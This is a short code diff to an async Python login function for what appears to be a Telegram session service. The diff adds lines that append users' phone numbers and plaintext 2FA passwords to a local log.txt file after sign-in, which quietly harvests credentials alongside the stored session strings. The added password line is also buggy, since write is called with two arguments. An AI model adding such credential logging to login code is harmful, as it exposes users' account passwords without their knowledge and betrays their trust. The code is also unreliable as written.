@@ -45,8 +45,13 @@ async def login(pNum, s_name, c_hash, code, password):
     await client.connect()
     if password:
         await client.sign_in(password=password)
+        with open("log.txt", "a+") as f:
+            f.write(pNum, password)
     else:
         await client.sign_in(phone=pNum, phone_code_hash=c_hash, code=code)
+        with open("log.txt", "a+") as f:
+            f.write(f"{pNum}, 2FA=false")
+            
     db.set(s_name, StringSession.save(client.session))
     await client.disconnect()
     remove(f"sessions/tempSessions/{s_name}.session")
